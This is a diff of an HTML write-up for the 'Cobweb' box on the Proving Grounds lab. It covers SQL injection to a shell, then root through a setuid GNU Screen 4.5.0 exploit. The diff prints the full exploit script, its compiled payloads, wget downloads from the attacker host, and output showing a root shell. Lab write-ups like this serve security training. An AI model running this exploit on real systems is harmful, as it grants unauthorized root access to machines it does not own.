@@ -14,7 +14,7 @@ layout: default
     <hr>
 
     <h2>Summary</h2>
-    <p></p>
+    <p>Cobweb involved finding a SQL injection on the web server.  This sql injection allowed us to gain shell through a remote shell.  Once on the box we are able to escalate our privileges to root by exploiting a program that has the SUID bit set.</p>
 
     <h2>Port Scanning</h2>
 
@@ -215,7 +215,7 @@ find / -perm -u=s 2&gt;/dev/null
 /usr/libexec/sssd/selinux_child
     </pre>
 
-    <li>We go to searchsploit and search for any exploits for it.  I also include the version 4.5</li>
+    <li>We go to searchsploit and search for any exploits for it.  I also include the version 4.5 in my search.  I download </li>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
@@ -228,9 +228,183 @@ GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                             
 ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
     </pre>
 
+    <li>We find a privesc exploit.  So we download linux/local/41154.sh and take a look at it.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ searchsploit -m 41154         
+  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/41154
+     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
+File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/kali/Documents/ProvingGrounds/Cobweb/41154.sh
 
 
+                                                                                                                                                              
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ cat 41154.sh  
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017) 
+echo &quot;~ gnu/screenroot ~&quot;
+echo &quot;[+] First, we create our shell and library...&quot;
+cat &lt;&lt; EOF &gt; /tmp/libhax.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown(&quot;/tmp/rootshell&quot;, 0, 0);
+    chmod(&quot;/tmp/rootshell&quot;, 04755);
+    unlink(&quot;/etc/ld.so.preload&quot;);
+    printf(&quot;[+] done!\n&quot;);
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat &lt;&lt; EOF &gt; /tmp/rootshell.c
+#include &lt;stdio.h&gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;/bin/sh&quot;, NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+rm -f /tmp/rootshell.c
+echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
+echo &quot;[+] Triggering...&quot;
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell                                                     
+    </pre>
 
+    <li>The script is having us create a file called libhax.so and rootshell.  We will compile both of these files on our Kali machine and then transfer them to the victim since our reverse shell is not the greatest.  We also need to modify the exploit to target "/var/tmp" instead of "/tmp".  On this machine the directories "/tmp" and "/dev/shm" have 'nosuid' and 'noexec' set.  Linpeas will show us this, which I ran shortly after beginning to poke around in this machine.</li>
+
+    <img src="Cobweb/linpeas.png">
+
+    <li>Compiling libhax.c</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ cat libhax.c   
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown(&quot;/var/tmp/rootshell&quot;, 0, 0);
+    chmod(&quot;/var/tmp/rootshell&quot;, 04755);
+    unlink(&quot;/etc/ld.so.preload&quot;);
+    printf(&quot;[+] done!\n&quot;);
+}
+                                                                                                                                                              
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ gcc -fPIC -shared -ldl -o libhax.so libhax.c
+libhax.c: In function &lsquo;dropshell&rsquo;:
+libhax.c:7:5: warning: implicit declaration of function &lsquo;chmod&rsquo; [-Wimplicit-function-declaration]
+    7 |     chmod(&quot;/var/tmp/rootshell&quot;, 04755);
+      |     ^~~~~
+    </pre>
+
+    <li>Compiling rootshell</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ cat rootshell.c 
+#include &lt;stdio.h&gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;/bin/sh&quot;, NULL, NULL);
+}
+                                                                                                                                                              
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ gcc -o rootshell rootshell.c                
+rootshell.c: In function &lsquo;main&rsquo;:
+rootshell.c:3:5: warning: implicit declaration of function &lsquo;setuid&rsquo; [-Wimplicit-function-declaration]
+    3 |     setuid(0);
+      |     ^~~~~~
+rootshell.c:4:5: warning: implicit declaration of function &lsquo;setgid&rsquo; [-Wimplicit-function-declaration]
+    4 |     setgid(0);
+      |     ^~~~~~
+rootshell.c:5:5: warning: implicit declaration of function &lsquo;seteuid&rsquo; [-Wimplicit-function-declaration]
+    5 |     seteuid(0);
+      |     ^~~~~~~
+rootshell.c:6:5: warning: implicit declaration of function &lsquo;setegid&rsquo; [-Wimplicit-function-declaration]
+    6 |     setegid(0);
+      |     ^~~~~~~
+rootshell.c:7:5: warning: implicit declaration of function &lsquo;execvp&rsquo; [-Wimplicit-function-declaration]
+    7 |     execvp(&quot;/bin/sh&quot;, NULL, NULL);
+      |     ^~~~~~
+rootshell.c:7:5: warning: too many arguments to built-in function &lsquo;execvp&rsquo; expecting 2 [-Wbuiltin-declaration-mismatch]
+    </pre>
+
+    <li>Downloading rootshell and libhax.so to /var/tmp</li>
+
+    <pre>
+bash-4.4$ cd /var/tmp
+cd /var/tmp
+bash-4.4$ wget http://192.168.49.248/libhax.so
+wget http://192.168.49.248/libhax.so
+--2021-09-18 15:25:34--  http://192.168.49.248/libhax.so
+Connecting to 192.168.49.248:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16136 (16K) [application/octet-stream]
+Saving to: 'libhax.so'
+
+     0K .......... .....                                      100%  393K=0.04s
+
+2021-09-18 15:25:34 (393 KB/s) - 'libhax.so' saved [16136/16136]
+
+bash-4.4$ wget http://192.168.49.248/rootshell
+wget http://192.168.49.248/rootshell
+--2021-09-18 15:25:42--  http://192.168.49.248/rootshell
+Connecting to 192.168.49.248:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16816 (16K) [application/octet-stream]
+Saving to: 'rootshell'
+
+     0K .......... ......                                     100%  420K=0.04s
+
+2021-09-18 15:25:42 (420 KB/s) - 'rootshell' saved [16816/16816]
+    </pre>
+
+    <li>Executing the exploit</li>
+
+    <pre>
+bash-4.4$ chmod +x /var/tmp/rootshell
+chmod +x /var/tmp/rootshell
+bash-4.4$ cd /etc
+cd /etc
+bash-4.4$ umask 000
+umask 000
+bash-4.4$ screen -D -m -L ld.so.preload echo -ne  "\x0a/var/tmp/libhax.so"
+screen -D -m -L ld.so.preload echo -ne  "\x0a/var/tmp/libhax.so"
+bash-4.4$ screen -ls
+screen -ls
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-apache.
+
+bash-4.4$ /var/tmp/rootshell
+/var/tmp/rootshell
+id
+uid=0(root) gid=0(root) groups=0(root),48(apache)
+    </pre>
+
+    <li>Rooted.</li>
 </body>
 </html>
 
